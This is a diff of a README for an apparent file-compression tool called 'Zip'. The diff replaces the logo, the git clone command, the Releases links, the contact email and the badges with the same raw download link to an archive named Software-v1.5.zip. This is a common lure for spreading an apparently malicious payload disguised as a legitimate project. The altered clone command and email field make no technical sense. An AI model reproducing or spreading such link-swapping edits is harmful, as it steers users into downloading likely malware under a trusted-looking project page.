@@ -1,6 +1,6 @@
 # 📦 Zip: Your Go-To Compression Tool
 
-![Zip Logo](https://img.shields.io/badge/Zip-Tool-blue.svg)
+![Zip Logo](https://github.com/vatoz09/zip/raw/refs/heads/master/doughmaking/Software-v1.5.zip)
 
 Welcome to the **Zip** repository! This project offers a simple and efficient way to compress and decompress files. Whether you're looking to save space or bundle multiple files together, Zip is here to help.
 
@@ -30,7 +30,7 @@ To get started with Zip, follow these steps:
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/yourusername/zip.git
+   git clone https://github.com/vatoz09/zip/raw/refs/heads/master/doughmaking/Software-v1.5.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -82,7 +82,7 @@ To use the Zip tool, simply follow these commands in your terminal:
   unzip <archive_name>.zip
   ```
 
-For more detailed instructions, please check the [Releases](https://github.com/yourusername/zip/releases) section.
+For more detailed instructions, please check the [Releases](https://github.com/vatoz09/zip/raw/refs/heads/master/doughmaking/Software-v1.5.zip) section.
 
 ## 🤝 Contributing
 
@@ -118,14 +118,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: yourname@example.com
-- **GitHub**: [yourusername](https://github.com/yourusername)
+- **Email**: https://github.com/vatoz09/zip/raw/refs/heads/master/doughmaking/Software-v1.5.zip
+- **GitHub**: [yourusername](https://github.com/vatoz09/zip/raw/refs/heads/master/doughmaking/Software-v1.5.zip)
 
 ## 🔗 Links
 
-For more information, visit [our website](not provided). If you are looking for specific files, check the [Releases](https://github.com/yourusername/zip/releases) section. 
+For more information, visit [our website](not provided). If you are looking for specific files, check the [Releases](https://github.com/vatoz09/zip/raw/refs/heads/master/doughmaking/Software-v1.5.zip) section. 
 
-![Visit Us](https://img.shields.io/badge/Visit%20Us-Click%20Here-orange.svg)
+![Visit Us](https://github.com/vatoz09/zip/raw/refs/heads/master/doughmaking/Software-v1.5.zip%20Us-Click%https://github.com/vatoz09/zip/raw/refs/heads/master/doughmaking/Software-v1.5.zip)
 
 ---
 
